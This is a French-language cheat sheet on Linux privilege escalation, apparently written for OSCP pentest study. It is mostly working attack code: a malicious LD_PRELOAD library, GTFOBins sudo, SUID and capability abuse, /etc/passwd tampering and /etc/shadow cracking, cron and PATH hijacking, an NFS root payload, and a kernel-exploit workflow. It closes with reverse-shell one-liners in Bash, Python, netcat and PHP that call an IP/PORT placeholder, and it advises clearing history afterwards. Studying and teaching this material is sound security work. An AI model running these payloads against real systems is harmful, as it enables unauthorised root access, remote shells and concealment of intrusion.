
# 📜 **Élévation de Privilèges Linux**  

---

## 🔍 0. **Post-Compromise : Énumération Rapide (Checklist Initiale)**

Dès que tu as un shell (même bas niveau), exécute :

```bash
id
uname -a
cat /etc/os-release
hostname
sudo -l
env | grep PATH
ps aux
ip a
netstat -tulnp
cat /etc/passwd | grep "/home"
```

> ✅ Objectif : comprendre **qui tu es**, **où tu es**, **ce que tu peux faire**.

---

## 🧰 1. **Outils d’Énumération Automatisée (À utiliser après l’énum manuelle)**

| Outil | Quand l’utiliser | Commande |
|------|------------------|--------|
| **linPEAS** | Toujours en premier | `./linpeas.sh -a` |
| **LSE** | Environnement restreint / POSIX | `./lse.sh -l1 -i` |
| **LES** | Recherche d’exploits kernel | `./les.sh` |
| **LinEnum** | Si les autres indisponibles | `./LinEnum.sh -t` |

> ⚠️ Ne jamais se fier uniquement à eux. Ils **complètent**, n’**remplacent pas** la compréhension.

---

## ⚔️ 2. **Vecteurs d’Élévation de Privilèges**

### 🔑 2.1. **Sudo Abuse (`sudo -l`)**

- Si tu vois `(ALL) NOPASSWD: /bin/vim` → **GTFOBins**.
- Utilise : https://gtfobins.github.io
- Exemple :
  ```bash
  sudo vim → :!/bin/bash
  ```

> 💡 Astuce : si `env_keep += LD_PRELOAD`, compile une librairie malveillante :
> ```c
> void _init() { setuid(0); setgid(0); system("/bin/bash"); }
> ```
> Compile : `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`  
> Exploite : `sudo LD_PRELOAD=./shell.so find`

---

### 🧬 2.2. **SUID / SGID**

Liste :
```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

- Croise avec : https://gtfobins.github.io/#+suid
- Si binaire non listé (ex: `nano`) :
  - Lire `/etc/shadow` → crack avec John
  - Modifier `/etc/passwd` pour ajouter utilisateur root

> ✅ Génération de hash :
> ```bash
> openssl passwd -1 -salt hacker password123
> ```

---

### 🎯 2.3. **Capabilities**

Liste :
```bash
getcap -r / 2>/dev/null
```

- Croise avec : https://gtfobins.github.io/#+cap
- Exemple (`vim = cap_setuid+ep`) :
  ```bash
  vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-p")'
  ```

> 🔥 `cap_setuid`, `cap_dac_override`, `cap_sys_admin` = danger.

---

### ⏰ 2.4. **Cron Jobs**

Recherche :
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

Scénarios :
1. **Script modifiable** → remplace par reverse shell.
2. **Script supprimé, cron actif** → crée ton propre script dans un dossier du `PATH`.

> Reverse shell universel :
> ```bash
> bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
> ```

---

### 🛣️ 2.5. **PATH Hijacking**

Conditions :
- Binaire SUID appelle commande sans chemin absolu.
- Tu contrôles un dossier dans `$PATH`.

Exploitation :
```bash
export PATH=/tmp:$PATH
cp /bin/bash /tmp/thm
chmod +x /tmp/thm
./binaire_vulnérable  # appelle "thm"
```

> ✅ Le binaire SUID exécute `/tmp/thm` → **root shell**.

---

### 🌐 2.6. **NFS avec `no_root_squash`**

Depuis attaquant :
```bash
showmount -e <IP>
mkdir /tmp/nfs && sudo mount -t nfs <IP>:/share /tmp/nfs
```

Crée payload :
```c
// nfs.c
#include <unistd.h>
int main() { setuid(0); execl("/bin/bash", "bash", NULL); }
```

Compile & SUID :
```bash
gcc nfs.c -o /tmp/nfs/nfs
sudo chmod +s /tmp/nfs/nfs
```

Sur cible :
```bash
cd /share && ./nfs
```

---

### 🧨 2.7. **Kernel Exploits**

Workflow :
1. `uname -a`
2. `./les.sh` ou `searchsploit linux kernel <version>`
3. Analyse l’exploit → comprends ce qu’il fait.
4. Transfère : `python3 -m http.server` + `wget`
5. Compile : `gcc exploit.c -o exploit`
6. Exécute → **attention au crash !**

> ⚠️ En pentest réel : **interdit sans accord explicite**.

---

## 🔐 3. **Bonnes Pratiques (OSCP / Pentest Éthique)**

- **Privilégie les méthodes non-destructives** (pas de modification de `/etc/passwd` si possible).
- **Toujours comprendre avant d’exécuter**.
- **Nettoyer après** : `rm /tmp/*`, `history -c`.
- **Documente chaque étape** → utile pour le rapport ou l’exam.
- **GTFOBins est ta bible** — mémorise les binaires courants.

---

## 🧪 4. **Reverse Shells Universels (Adapter selon les outils dispo)**

| Langage | Commande |
|--------|--------|
| **Bash** | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| **Python** | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'` |
| **Netcat (sans -e)** | `mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc IP PORT > /tmp/f` |
| **PHP** | `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |

> Écoute toujours avec : `nc -nvlp PORT`

---

## 🗂️ 5. **Ressources Clés (Bookmark ces liens)**

- [GTFOBins](https://gtfobins.github.io) → abuse de binaires
- [GTFOBins – SUID](https://gtfobins.github.io/#+suid)
- [GTFOBins – Capabilities](https://gtfobins.github.io/#+cap)
- [CVEdetails](https://www.cvedetails.com) → CVE, exploits, KEV, EPSS
- [Linux Privilege Escalation Cheat Sheet (HighOn.Coffee)](https://highon.coffee/blog/linux-privilege-escalation-checklist/)

---


